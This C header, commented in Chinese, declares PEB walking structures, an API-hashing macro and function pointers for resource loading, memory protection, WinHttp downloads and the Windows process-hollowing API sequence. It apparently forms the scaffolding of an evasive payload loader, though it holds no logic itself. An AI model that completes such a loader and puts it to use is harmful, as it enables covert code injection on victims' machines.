#pragma once
#include "hash.h"
#include <windows.h>
#include <winternl.h>
//计算哈希值
#define ROTR32(value, shift)	(((DWORD) value >> (BYTE) shift) | ((DWORD) value << (32 - (BYTE) shift)))

//重新定义PEB结构。winternl.h中的结构定义是不完整的。
typedef struct _MY_PEB_LDR_DATA {
	ULONG Length;
	BOOL Initialized;
	PVOID SsHandle;
	LIST_ENTRY InLoadOrderModuleList;
	LIST_ENTRY InMemoryOrderModuleList;
	LIST_ENTRY InInitializationOrderModuleList;
} MY_PEB_LDR_DATA, *PMY_PEB_LDR_DATA;

typedef struct _MY_LDR_DATA_TABLE_ENTRY
{
	LIST_ENTRY InLoadOrderLinks;
	LIST_ENTRY InMemoryOrderLinks;
	LIST_ENTRY InInitializationOrderLinks;
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
} MY_LDR_DATA_TABLE_ENTRY, *PMY_LDR_DATA_TABLE_ENTRY;


//定义函数指针

// Kernel32 
typedef void (WINAPI* pfnReleaseActCtx)(
	HANDLE hActCtx
);
typedef BOOL (WINAPI* pfnDeactivateActCtx)(
	DWORD     dwFlags,
	ULONG_PTR ulCookie
);
typedef BOOL (WINAPI* pfnActivateActCtx)(
	HANDLE    hActCtx,
	ULONG_PTR* lpCookie
);
typedef FARPROC (WINAPI* pfnGetProcAddress)(
	HMODULE hModule,
	LPCSTR  lpProcName
);
typedef BOOL (WINAPI* pfnVirtualProtect)(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flNewProtect,
	PDWORD lpflOldProtect
);
typedef HMODULE (WINAPI* pfnGetModuleHandleA)(
	LPCSTR lpModuleName
);
typedef HANDLE (WINAPI* pfnCreateActCtxA)(
	PCACTCTXA pActCtx
);
typedef LPVOID (WINAPI* pfnLockResource)(
	HGLOBAL hResData
);
typedef DWORD (WINAPI* pfnSizeofResource)(
	HMODULE hModule,
	HRSRC   hResInfo
);
typedef HRSRC(WINAPI* pfnFindResourceA)(
	HMODULE hModule,
	LPCSTR  lpName,
	LPCSTR  lpType
);

typedef HGLOBAL(WINAPI* pfnLoadResource)(
	HMODULE hModule,
	HRSRC   hResInfo
);
typedef LPVOID (WINAPI* pfnVirtualAlloc)(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect
);
typedef DWORD(WINAPI* pfnGetModuleFileNameA)(
	HMODULE hModule,
	LPSTR   lpFilename,
	DWORD   nSize
	);

typedef BOOL (WINAPI *pfnCreateProcessA)(
	LPCSTR                lpApplicationName,
	LPSTR                 lpCommandLine,
	LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	BOOL                  bInheritHandles,
	DWORD                 dwCreationFlags,
	LPVOID                lpEnvironment,
	LPCSTR                lpCurrentDirectory,
	LPSTARTUPINFOA        lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation
);
typedef BOOL (WINAPI * pfnGetThreadContext)(
	HANDLE    hThread,
	LPCONTEXT lpContext
);

typedef BOOL (WINAPI * pfnReadProcessMemory)(
	HANDLE  hProcess,
	LPCVOID lpBaseAddress,
	LPVOID  lpBuffer,
	SIZE_T  nSize,
	SIZE_T* lpNumberOfBytesRead
);

typedef LPVOID (WINAPI * pfnVirtualAllocEx)(
	HANDLE hProcess,
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect
);

typedef BOOL (WINAPI * pfnWriteProcessMemory)(
	HANDLE  hProcess,
	LPVOID  lpBaseAddress,
	LPCVOID lpBuffer,
	SIZE_T  nSize,
	SIZE_T* lpNumberOfBytesWritten
);

typedef BOOL (WINAPI* pfnSetThreadContext)(
	HANDLE        hThread,
	const CONTEXT* lpContext
);


typedef DWORD (WINAPI* pfnResumeThread)(
	HANDLE hThread
);

typedef HMODULE(WINAPI* pfnLoadLibraryA)(LPCSTR lpLibFileName);

//user_32

typedef int (WINAPI *pfnMessageBoxA)(HWND hWnd,LPCSTR lpText,LPCSTR lpCaption,UINT uType);



// Msvcrt
typedef void* (__cdecl* pfnmalloc)(size_t _Size);
typedef void   (WINAPI* pfnfree)(void* _Memory);
typedef  void* (WINAPI* pfnmemset)(_Out_writes_bytes_all_(_Size) void* _Dst, _In_ int _Val, _In_ size_t _Size);
typedef void* (WINAPI* pfnmemcpy)(void* _Dst, const void* _Src, _In_ size_t _Size);
typedef void(WINAPI* pfnsrand)(_In_ unsigned int _Seed);
typedef __time32_t(WINAPI* pfn_time32)(_Out_opt_ __time32_t* _Time);
typedef int(WINAPI* pfnrand)(void);
typedef char* (WINAPI* pfnstrrchr)(_In_z_ const char* _Str, _In_ int _Ch);
typedef size_t(WINAPI* pfnstrlen)(_In_z_ const char* _Str);
typedef void* (WINAPI* pfmemmove)(_Out_writes_bytes_all_opt_(_Size) void* _Dst, _In_reads_bytes_opt_(_Size) const void* _Src, _In_ size_t _Size);
typedef int(__cdecl* pfnmemcmp)(_In_reads_bytes_(_Size) const void* _Buf1, _In_reads_bytes_(_Size) const void* _Buf2, _In_ size_t _Size);
typedef char* (WINAPI* pfnstrcpy)(char* _Dest, const char* _Source);
typedef char* (WINAPI* pfnstrcat)(char* _Dest, _In_z_ const char* _Source);


//WinHttp
typedef LPVOID HINTERNET;
typedef HINTERNET* LPHINTERNET;

typedef WORD INTERNET_PORT;

typedef INTERNET_PORT* LPINTERNET_PORT;
typedef HINTERNET(WINAPI * pfnWinHttpOpen)(
	LPCWSTR pszAge,
	DWORD   dwAccessType,
	LPCWSTR pszProxyW,
	LPCWSTR pszProxyBypassW,
	DWORD   dwFlags
);

typedef  HINTERNET (WINAPI* pfnWinHttpConnect)(
	HINTERNET     hSession,
	LPCWSTR       pswzServerName,
	INTERNET_PORT nServerPort,
	DWORD         dwReserved
);

typedef HINTERNET (WINAPI *pfnWinHttpOpenRequest)(
	HINTERNET hConnect,
	LPCWSTR   pwszVerb,
	LPCWSTR   pwszObjectName,
	LPCWSTR   pwszVersion,
	LPCWSTR   pwszReferrer,
	LPCWSTR* ppwszAcceptTypes,
	DWORD     dwFlags
);
typedef BOOL(WINAPI* pfnWinHttpAddRequestHeaders)(
	HINTERNET hRequest,
	LPCWSTR   lpszHeaders,
	DWORD     dwHeadersLength,
	DWORD     dwModifiers
);

typedef BOOL(WINAPI* pfnWinHttpSendRequest)(
	HINTERNET hRequest,
	LPCWSTR   lpszHeaders,
	DWORD     dwHeadersLength,
	LPVOID    lpOptional,
	DWORD     dwOptionalLength,
	DWORD     dwTotalLength,
	DWORD_PTR dwContext
);

typedef BOOL (WINAPI* pfnWinHttpReceiveResponse)(
	HINTERNET hRequest,
	LPVOID    lpReserved
);

typedef BOOL (WINAPI* pfnWinHttpQueryDataAvailable)(
	HINTERNET hRequest,
	LPDWORD   lpdwNumberOfBytesAvailable
);

typedef BOOL (WINAPI* pfnWinHttpReadData)(
	HINTERNET hRequest,
	LPVOID    lpBuffer,
	DWORD     dwNumberOfBytesToRead,
	LPDWORD   lpdwNumberOfBytesRead
);
typedef BOOL (WINAPI* pfnWinHttpCloseHandle)(
	HINTERNET hInternet
);



//函数指针结构体
typedef struct _FUNCTIONS
{
	pfnReleaseActCtx fnReleaseActCtx;
	pfnDeactivateActCtx fnDeactivateActCtx;
	pfnActivateActCtx fnActivateActCtx;
	pfnGetProcAddress fnGetProcAddress;
	pfnVirtualProtect fnVirtualProtect;
	pfnGetModuleHandleA fnGetModuleHandleA;
	pfnCreateActCtxA fnCreateActCtxA;
	pfnLockResource fnLockResource;
	pfnSizeofResource fnSizeofResource;
	pfnFindResourceA fnFindResourceA;
	pfnLoadResource fnLoadResource;
	pfnVirtualAlloc fnVirtualAlloc;
	pfnGetModuleFileNameA fnGetModuleFileNameA;
	pfnCreateProcessA fnCreateProcessA;
	pfnGetThreadContext fnGetThreadContext;
	pfnReadProcessMemory fnReadProcessMemory;
	pfnVirtualAllocEx fnVirtualAllocEx;
	pfnWriteProcessMemory fnWriteProcessMemory;
	pfnSetThreadContext fnSetThreadContext;
	pfnResumeThread fnResumeThread;

	pfnLoadLibraryA fnLoadLibraryA;
	
	
	
	pfnMessageBoxA fnMessageBoxA;
	pfnmalloc fnmalloc;
	pfnfree fnfree;
	pfnmemset fnmemset;
	pfnmemcpy fnmemcpy;
	pfnmemcmp fnmemcmp;
	pfnsrand fnsrand;
	pfnrand fnrand;
	pfnstrlen fnstrlen;
	
	pfnstrcpy fnstrcpy;
	pfnstrcat fnstrcat;

	pfnWinHttpOpen fnWinHttpOpen;
	pfnWinHttpConnect fnWinHttpConnect;
	pfnWinHttpOpenRequest fnWinHttpOpenRequest;
	pfnWinHttpAddRequestHeaders fnWinHttpAddRequestHeaders;
	pfnWinHttpSendRequest fnWinHttpSendRequest;
	pfnWinHttpReceiveResponse fnWinHttpReceiveResponse;
	pfnWinHttpQueryDataAvailable fnWinHttpQueryDataAvailable;
	pfnWinHttpReadData fnWinHttpReadData;
	pfnWinHttpCloseHandle fnWinHttpCloseHandle;

}Functions,*Pfunctions;


